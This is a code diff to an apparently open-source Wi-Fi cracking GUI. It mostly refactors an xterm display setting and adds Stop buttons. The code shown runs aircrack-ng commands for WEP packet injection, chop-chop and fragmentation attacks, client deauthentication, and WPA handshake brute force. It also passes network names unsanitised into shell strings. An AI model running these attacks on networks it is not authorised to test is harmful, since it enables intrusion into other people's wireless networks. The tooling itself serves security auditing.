@@ -18,7 +18,7 @@ from font_settings import *
 from ivs_settings import *
 from database import *
 
-__version__= 1.43
+__version__= 1.44
 
 #
 # Network scan global variable
@@ -28,6 +28,7 @@ scan_control = 0
 # Update checking loop (control variable)
 #
 updater_control = 0
+xterm_setting = ''
 #
 # Wep Global variables
 #
@@ -586,6 +587,7 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
     #
     ###################
     def scan_process1_thread(self):
+        global xterm_setting
         global error_catch
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         error_catch = commands.getstatusoutput("airodump-ng --write /tmp/fern-log/zfern-wep --output-format csv \
@@ -605,6 +607,7 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
 
     ###################
     def scan_process2_thread(self):
+        global xterm_setting
         global error_catch
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         if 'static-channel.log' in os.listdir('/tmp/fern-log'):
@@ -612,17 +615,14 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
         else:
             channel = ''
 
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
         error_catch = commands.getstatusoutput("%s 'airodump-ng --write /tmp/fern-log/zfern-wep --output-format csv\
-                                        --encrypt wep %s'"%(xterm,monitor))      #FOR WEP
+                                        --encrypt wep %s'"%(xterm_setting,monitor))      #FOR WEP
         if error_catch[0] != 0:
             self.emit(QtCore.SIGNAL('internal scan error'))
 
 
     def scan_process2_thread1(self):
+        global xterm_setting
         global error_catch
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         if 'static-channel.log' in os.listdir('/tmp/fern-log'):
@@ -630,12 +630,8 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
         else:
             channel = ''
 
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
         error_catch = commands.getstatusoutput("%s 'airodump-ng --write /tmp/fern-log/WPA/zfern-wpa \
-                                    --output-format csv  --encrypt wpa %s'"%(xterm,monitor))  # FOR WPA
+                                    --output-format csv  --encrypt wpa %s'"%(xterm_setting,monitor))  # FOR WPA
         if error_catch[0] != 0:
             self.emit(QtCore.SIGNAL('internal scan error'))
 
@@ -643,16 +639,13 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
     ###########################
     def scan_process3_thread(self):
         global error_catch
+        global xterm_setting
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         if 'static-channel.log' in os.listdir('/tmp/fern-log'):
             channel = str(reader('/tmp/fern-log/static-channel.log'))
         else:
             channel = ''
 
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
         error_catch = commands.getstatusoutput("airodump-ng --channel %s --write /tmp/fern-log/zfern-wep \
                                     --output-format csv  --encrypt wep %s"%(channel,monitor))    #FOR WEP
         if error_catch[0] != 0:
@@ -661,16 +654,13 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
 
     def scan_process3_thread1(self):
         global error_catch
+        global xterm_activation
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         if 'static-channel.log' in os.listdir('/tmp/fern-log'):
             channel = str(reader('/tmp/fern-log/static-channel.log'))
         else:
             channel = ''
 
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
         error_catch = commands.getstatusoutput("airodump-ng --channel %s --write /tmp/fern-log/WPA/zfern-wpa \
                                 --output-format csv  --encrypt wpa %s"%(channel,monitor))# FOR WPA
         if error_catch[0] != 0:
@@ -679,40 +669,36 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
     #######################
     def scan_process4_thread(self):
         global error_catch
+        global xterm_setting
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         if 'static-channel.log' in os.listdir('/tmp/fern-log'):
             channel = str(reader('/tmp/fern-log/static-channel.log'))
         else:
             channel = ''
 
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
         error_catch = commands.getstatusoutput("%s 'airodump-ng --channel %s --write /tmp/fern-log/zfern-wep \
-                                    --output-format csv  --encrypt wep %s'"%(xterm,channel,monitor))# FOR WEP
+                                    --output-format csv  --encrypt wep %s'"%(xterm_setting,channel,monitor))# FOR WEP
         if error_catch[0] != 0:
             self.emit(QtCore.SIGNAL('internal scan error'))
 
     def scan_process4_thread1(self):
         global error_catch
+        global xterm_setting
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         if 'static-channel.log' in os.listdir('/tmp/fern-log'):
             channel = str(reader('/tmp/fern-log/static-channel.log'))
         else:
             channel = ''
 
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
         error_catch = commands.getstatusoutput("%s 'airodump-ng --channel %s --write /tmp/fern-log/WPA/zfern-wpa \
-                                    --output-format csv  --encrypt wpa %s'"%(xterm,channel,monitor))
+                                    --output-format csv  --encrypt wpa %s'"%(xterm_setting,channel,monitor))
         if error_catch[0] != 0:
             self.emit(QtCore.SIGNAL('internal scan error'))
 
     def scan_wep(self):
         global scan_control
+        global xterm_activation
+
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         commands.getstatusoutput('rm -r /tmp/fern-log/*.csv')
         commands.getstatusoutput('rm -r /tmp/fern-log/*.cap')
@@ -726,17 +712,10 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
         else:
             channel = ''
 
-        # Xterm setting consideration
-
-        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
-            xterm = 'xterm -e'
-        else:
-            xterm = ''
-
         # Channel desision block
         if scan_control == 0:
             if 'static-channel.log' not in os.listdir('/tmp/fern-log'):
-                if 'xterm-settings.log' not in os.listdir('/tmp/fern-log'):
+                if len(xterm_setting) == 0:
                     thread.start_new_thread(self.scan_process1_thread,())
                     thread.start_new_thread(self.scan_process1_thread1,())
 
@@ -744,7 +723,7 @@ class mainwindow(QtGui.QDialog,Ui_Dialog):
                     thread.start_new_thread(self.scan_process2_thread,())
                     thread.start_new_thread(self.scan_process2_thread1,())
             else:
-                if 'xterm-settings.log' not in os.listdir('/tmp/fern-log'):
+                if len(xterm_setting) == 0:
                     thread.start_new_thread(self.scan_process3_thread,())
                     thread.start_new_thread(self.scan_process3_thread1,())
                 else:
@@ -927,6 +906,38 @@ class wep_attack_dialog(QtGui.QDialog,wep_window):
         commands.getstatusoutput('killall airmon-ng')
         self.label_7.setText("Points<font Color=red>\t Stopped</font>")
 
+    def wep_disable_items(self):
+        self.cracking_label.setEnabled(False)
+        self.wep_status_label.setEnabled(False)
+        self.injecting_label.setEnabled(False)
+        self.associate_label.setEnabled(False)
+        self.injection_work_label.setEnabled(False)
+        self.gathering_label.setEnabled(False)
+        self.ivs_progress_label.setEnabled(False)
+        self.cracking_label.setText("Cracking Encryption")
+        self.wep_status_label.setText("wep encryption status")
+        self.injecting_label.setText("Gathering packets")
+        self.associate_label.setText("Associating with Access Point")
+        self.injection_work_label.setText(" \t Injection capability status ")
+        self.ivs_progress_label.setText('captured IVS status')
+        self.gathering_label.setText("Packet injection Status")
+        self.wep_attack_button.setText("Attack")
+
+
+    def cancel_wep_attack(self):
+        commands.getstatusoutput('killall airodump-ng')
+        commands.getstatusoutput('killall aircrack-ng')
+        commands.getstatusoutput('killall aireplay-ng')
+        self.disconnect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wep_attack)
+        self.connect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.wep_launch_attack)
+        icon = QtGui.QIcon()
+        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_2.png"%(os.getcwd())))
+        self.wep_attack_button.setIcon(icon)
+        self.wep_attack_button.setText("Attack")
+
+
+
+
     def injection_working(self):
         self.injection_work_label.setEnabled(True)
         self.injection_work_label.setText('<font color=yellow> Injection is working on %s</font>'%(str(reader('/tmp/fern-log/monitor.log'))))
@@ -999,6 +1010,10 @@ class wep_attack_dialog(QtGui.QDialog,wep_window):
         self.wep_key_label.setText('<font color=red>%s</font>'%(WEP))
         self.wep_status_label.setEnabled(True)
         self.wep_status_label.setText('<font color=yellow>Wep Encryption Broken</font>')
+        icon = QtGui.QIcon()
+        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_2.png"%(os.getcwd())))
+        self.wep_attack_button.setIcon(icon)
+        self.wep_attack_button.setText('Attack')
         commands.getstatusoutput('killall airodump-ng')
         commands.getstatusoutput('killall airmon-ng')
 
@@ -1072,21 +1087,23 @@ class wep_attack_dialog(QtGui.QDialog,wep_window):
 
         ########################################### SPECIAL COMMAND THREADS ######################################
     def dump_thread(self):
+        global xterm_setting
         wep_victim_channel = victim_channel
         access_point_mac = victim_mac
         monitor = str(reader('/tmp/fern-log/monitor.log'))
-        commands.getstatusoutput('airodump-ng -c %s -w /tmp/fern-log/WEP-DUMP/wep_dump --bssid %s %s'%(wep_victim_channel,access_point_mac,monitor))
+        commands.getstatusoutput('%s airodump-ng -c %s -w /tmp/fern-log/WEP-DUMP/wep_dump --bssid %s %s'%(xterm_setting,wep_victim_channel,access_point_mac,monitor))
 
     def association_thread(self):
         global scan_control
+        global xterm_setting
         monitor = str(reader('/tmp/fern-log/monitor.log'))
-        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log'))
+        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log').strip('\n'))
 
         self.emit(QtCore.SIGNAL("associating"))
         association_string = ''
         association_timer = 0
         while True:
-            association_string += str(commands.getstatusoutput('aireplay-ng -1 0 -a %s -h %s %s'%(victim_mac,attacker_mac_address.strip('\n'),monitor)))
+            association_string += str(commands.getstatusoutput('aireplay-ng -1 0 -a %s -h %s %s'%(victim_mac,attacker_mac_address,monitor)))
             if'Association successful :-)' in association_string:
                 thread.start_new_thread(self.successful_accociation_process,())
                 break
@@ -1129,31 +1146,35 @@ class wep_attack_dialog(QtGui.QDialog,wep_window):
 
 
     def arp_request_thread(self):
+        global xterm_setting
         access_point_mac = victim_mac
         monitor = str(reader('/tmp/fern-log/monitor.log'))
-        commands.getstatusoutput("cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -3 -e '%s' -b %s %s"%(victim_access_point,access_point_mac,monitor))
+        commands.getstatusoutput("cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -3 -e '%s' -b %s %s"%(xterm_setting,victim_access_point,access_point_mac,monitor))
 
     def chop_chop_thread(self):
-        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log'))
+        global xterm_setting
+        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log').strip('\n'))
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         access_point_mac = victim_mac
-        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -4 -F -h %s  %s'%(attacker_mac_address,monitor))
+        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -4 -F -h %s %s'%(xterm_setting,attacker_mac_address,monitor))
 
-        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y \
-                                    /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/chop_chop.cap'%(access_point_mac,attacker_mac_address))
+        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y \
+                                    /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/chop_chop.cap'%(xterm_setting,access_point_mac,attacker_mac_address))
+
         self.emit(QtCore.SIGNAL("chop-chop injecting"))
         self.emit(QtCore.SIGNAL("chop-chop injecting"))
-        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/chop_chop.cap %s'%(monitor))
+        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/chop_chop.cap %s'%(xterm_setting,monitor))
 
     def fragmentation_thread(self):
-        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log'))
+        global xterm_setting
+        attacker_mac_address = str(reader('/tmp/fern-log/monitor-mac-address.log').strip('\n'))
         monitor = str(reader('/tmp/fern-log/monitor.log'))
         access_point_mac = victim_mac
 
-        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -5 -F -b %s -h %s %s'%(access_point_mac,attacker_mac_address,monitor))
-        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/fragmented.cap'%(access_point_mac,attacker_mac_address))
+        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -5 -F -b %s -h %s %s'%(xterm_setting,access_point_mac,attacker_mac_address,monitor))
+        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s packetforge-ng -0 -a %s -h %s -k 255.255.255.255 -l 255.255.255.255 -y /tmp/fern-log/WEP-DUMP/*.xor -w /tmp/fern-log/WEP-DUMP/fragmented.cap'%(xterm_setting,access_point_mac,attacker_mac_address))
         self.emit(QtCore.SIGNAL("fragment injecting"))
-        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/fragmented.cap %s'%(monitor))
+        commands.getstatusoutput('cd /tmp/fern-log/WEP-DUMP/ \n %s aireplay-ng -2 -F -r /tmp/fern-log/WEP-DUMP/fragmented.cap %s'%(xterm_setting,monitor))
 
 
     def crack_wep(self):
@@ -1210,15 +1231,23 @@ class wep_attack_dialog(QtGui.QDialog,wep_window):
     def wep_launch_attack(self):
         global wep_string
         global scan_label
+        global ivs_number
+        global WEP
+
+        ivs_number = 0
+        WEP = ''
         wep_string = ''
+        self.wep_disable_items()
         scan_label.setText("Points<font Color=red>\t Stopped</font>")
         commands.getstatusoutput('killall airodump-ng')
         commands.getstatusoutput('killall airmon-ng')
-
-        global ivs_number
-        global WEP
-        ivs_number = 0
-        WEP = ''
+        self.ivs_progress.setValue(0)
+        self.disconnect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.wep_launch_attack)
+        self.connect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wep_attack)
+        icon = QtGui.QIcon()
+        icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
+        self.wep_attack_button.setIcon(icon)
+        self.wep_attack_button.setText('Stop')
         commands.getstatusoutput('rm -r /tmp/fern-log/WEP-DUMP/*')
         thread.start_new_thread(self.injection_status,())
         thread.start_new_thread(self.run_wep_attack,())
@@ -1279,6 +1308,37 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
     # SIGNALS AND SLOTS
     #
 
+    def wpa_disable_items(self):
+        self.probe_label.setEnabled(False)
+        self.dictionary_label.setEnabled(False)
+        self.handshake_label.setEnabled(False)
+        self.deauthenticate_label.setEnabled(False)
+        self.bruteforcing_label.setEnabled(False)
+        self.bruteforce_progress_label.setEnabled(False)
+        self.wpa_status_label.setEnabled(False)
+        self.probe_label.setText( "Probing Access Point")
+        self.dictionary_label.setText( "current dictionary file")
+        self.handshake_label.setText( "Handshake status")
+        self.wpa_attack_button.setText( "Attack")
+        self.deauthenticate_label.setText( "deauthentication status")
+        self.bruteforcing_label.setText( "bruteforcing encryption")
+        self.bruteforce_progress_label.setText( "current phrase")
+        self.wpa_status_label.setText( "wpa encryption status")
+        self.wpa_attack_button.setText('Attack')
+
+    def cancel_wpa_attack(self):
+        commands.getstatusoutput('killall airodump-ng')
+        commands.getstatusoutput('killall aircrack-ng')
+        commands.getstatusoutput('killall aireplay-ng')
+        self.disconnect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
+        self.connect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
+        icon = QtGui.QIcon()
+        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_6.png"%(os.getcwd())))
+        self.wpa_attack_button.setIcon(icon)
+        self.wpa_attack_button.setText('Attack')
+
+
+
     def update_client_list(self):
         global client_list
         client_mac_addresses = []
@@ -1309,6 +1369,10 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
         self.bruteforcing_label.setText('<font color=yellow>Bruteforcing WPA Encryption</font>')
 
     def wpa_key_found(self):
+        icon = QtGui.QIcon()
+        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_6.png"%(os.getcwd())))
+        self.wpa_attack_button.setIcon(icon)
+        self.wpa_attack_button.setText('Attack')
         wpa_key_read = reader('/tmp/fern-log/WPA-DUMP/wpa_key.txt')
         self.finished_label.setEnabled(True)
         self.finished_label.setText('<font color=yellow>Finished</font>')
@@ -1368,6 +1432,7 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
 
     def launch_brutefore(self):
         global control
+        global xterm_setting
         crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng -a 2 -w '%s' *.cap -l wpa_key.txt | grep 'Current passphrase'"%(wordlist),
                              shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
 
@@ -1442,11 +1507,11 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
 
     def wpa_capture(self):
         monitor_interface = str(reader('/tmp/fern-log/monitor.log'))
-        commands.getstatusoutput('airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(wpa_victim_mac_address,wpa_victim_channel,monitor_interface))
+        commands.getstatusoutput('%s airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(xterm_setting,wpa_victim_mac_address,wpa_victim_channel,monitor_interface))
 
     def deauthenticate_client(self):
         monitor_interface = str(reader('/tmp/fern-log/monitor.log'))
-        commands.getstatusoutput('aireplay-ng -a %s -c %s -0 5 %s'%(wpa_victim_mac_address,select_client,monitor_interface))
+        commands.getstatusoutput('%s aireplay-ng -a %s -c %s -0 5 %s'%(xterm_setting,wpa_victim_mac_address,select_client,monitor_interface))
 
     def capture_check(self):
         commands.getstatusoutput('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')
@@ -1458,7 +1523,7 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
             thread.start_new_thread(self.deauthenticate_client,())
             time.sleep(10)
             thread.start_new_thread(self.capture_check,())
-        self.emit(QtCore.SIGNAL("handshake captured"))                                        # THIS IS THE PROGRAM COUNTINUE
+        self.emit(QtCore.SIGNAL("handshake captured"))                  # Handshake captured
         commands.getstatusoutput('killall airodump-ng')
         commands.getstatusoutput('killall aireplay-ng')
         time.sleep(1)
@@ -1507,6 +1572,7 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
         global select_client
         global progress_bar_max
         global scan_label
+        self.wpa_disable_items()
         scan_label.setText("Points<font Color=red>\t Stopped</font>")
         commands.getstatusoutput('killall airodump-ng')
         commands.getstatusoutput('killall airmon-ng')
@@ -1549,6 +1615,13 @@ class wpa_attack_dialog(QtGui.QDialog,wpa_window):
                 self.probe_label.setEnabled(True)
                 self.probe_label.setText("<font color=yellow>Probing Access Point</font>")
                 commands.getstatusoutput('touch /tmp/fern-log/WPA-DUMP/capture_status.log')
+                self.bruteforce_progressbar.setValue(0)
+                self.disconnect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
+                self.connect(self.wpa_attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
+                icon = QtGui.QIcon()
+                icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
+                self.wpa_attack_button.setIcon(icon)
+                self.wpa_attack_button.setText('Stop')
 
                 thread.start_new_thread(self.wpa_capture,())
 
@@ -1758,17 +1831,13 @@ class tips_window(QtGui.QDialog,tips_dialog):
 #
 class settings_dialog(QtGui.QDialog,settings):
     def __init__(self):
+        global xterm_activation
         QtGui.QDialog.__init__(self)
 
         self.setupUi(self)
-        try:
-	       remove('fern-settings','xterm-settings.dat')
-        except IOError:pass
-        try:
-            if reader('/tmp/fern-log/xterm-settings.log').isdigit() == True:
-                self.xterm_checkbox.setChecked(True)
-        except IOError:
-            pass
+        if len(xterm_setting) > 0:
+            self.xterm_checkbox.setChecked(True)
+
         list_ = ['All Channels']
         for list_numbers in range(1,15):
             list_.append(str(list_numbers))
@@ -1796,12 +1865,13 @@ class settings_dialog(QtGui.QDialog,settings):
     # Log xtern selectionn to fern-settings directory manual channel
     #
     def xterm(self):
+        global xterm_setting
+        global xterm_activation
         xterm_settings = self.xterm_checkbox.isChecked()
         if xterm_settings == True:
-            remove('/tmp/fern-log','xterm-settings.log')
-            write('/tmp/fern-log/xterm-settings.log','1')
+            xterm_setting = 'xterm -geometry 100 -e'
         else:
-            remove('/tmp/fern-log','xterm-settings.log')
+            xterm_setting = ''
 
 
 
